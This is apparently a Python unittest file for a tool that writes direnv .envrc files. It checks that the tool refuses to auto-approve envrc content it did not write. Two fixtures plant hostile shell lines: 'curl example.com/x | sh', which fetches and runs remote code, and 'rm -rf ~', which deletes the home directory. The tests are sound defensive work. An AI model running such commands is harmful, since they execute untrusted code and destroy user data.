"""apps --here without a VM, against a stand-in direnv:
python3 -m unittest discover -s tests -p test_apps.py"""
import contextlib
import importlib.util
import io
import os
import tempfile
import unittest
from unittest.mock import patch

SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts", "mos-apps.py")
spec = importlib.util.spec_from_file_location("mos_apps", SCRIPT)
apps = importlib.util.module_from_spec(spec)
spec.loader.exec_module(apps)

# `status --json` says whether $PWD/.envrc is allowed ($FAKE_ALLOWED: 0 yes,
# 1 no); `allow` is logged and exits with $FAKE_ALLOW (default 0).
DIRENV = """#!/bin/sh
echo "direnv $*" >>"$FAKE_LOG"
case "$1" in
status) printf '{"state":{"foundRC":{"allowed":%s,"path":"%s/.envrc"}}}' "${FAKE_ALLOWED:-1}" "$PWD" ;;
allow) exit "${FAKE_ALLOW:-0}" ;;
esac
"""


class Here(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        t = self.tmp.name
        self.folder, bin_, self.log = os.path.join(t, "project"), os.path.join(t, "bin"), os.path.join(t, "log")
        os.makedirs(self.folder)
        os.makedirs(bin_)
        with open(os.path.join(bin_, "direnv"), "w") as fh:
            fh.write(DIRENV)
        os.chmod(os.path.join(bin_, "direnv"), 0o755)
        self.env = {"PATH": bin_ + os.pathsep + os.environ["PATH"], "FAKE_LOG": self.log}

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, apps_, **env):
        out = io.StringIO()
        with patch.dict(os.environ, dict(self.env, **env)), \
                contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            result = apps.here_write(self.folder, apps_)
        return result, out.getvalue()

    def allowed(self):
        try:
            with open(self.log) as f:
                return any(l.startswith("direnv allow") for l in f)
        except FileNotFoundError:
            return False

    def test_own_envrc_is_allowed(self):
        (kept, loads), _ = self.write(["hello"])
        self.assertTrue(kept and loads)
        self.assertTrue(self.allowed())

    def test_unapproved_envrc_is_not_allowed(self):
        with open(apps.envrc(self.folder), "w") as f:
            f.write("curl example.com/x | sh\n")
        (kept, loads), out = self.write(["hello"])
        self.assertTrue(kept)
        self.assertFalse(loads)
        self.assertFalse(self.allowed())
        self.assertIn("curl example.com/x | sh", out)  # shown to the user
        self.assertIn(f"direnv allow {self.folder}", out)
        with open(apps.envrc(self.folder)) as f:
            self.assertIn("use nix -p hello", f.read())

    def test_already_allowed_envrc_stays_allowed(self):
        with open(apps.envrc(self.folder), "w") as f:
            f.write("export A=1\n")
        (_, loads), _ = self.write(["hello"], FAKE_ALLOWED="0")
        self.assertTrue(loads)
        self.assertTrue(self.allowed())

    def test_failed_allow_is_reported(self):
        (kept, loads), out = self.write(["hello"], FAKE_ALLOW="1")
        self.assertTrue(kept)
        self.assertFalse(loads)
        self.assertIn("didn't work", out)

    def test_update_does_not_allow_foreign_lines(self):
        with open(apps.envrc(self.folder), "w") as f:
            f.write(f"rm -rf ~\n{apps.BEGIN}\nuse nix -p hello\n{apps.END}\n")
        out = io.StringIO()
        with patch.dict(os.environ, self.env), patch("os.getcwd", return_value=self.folder), \
                contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            self.assertEqual(apps.here_update(), 1)
        self.assertFalse(self.allowed())


if __name__ == "__main__":
    unittest.main()
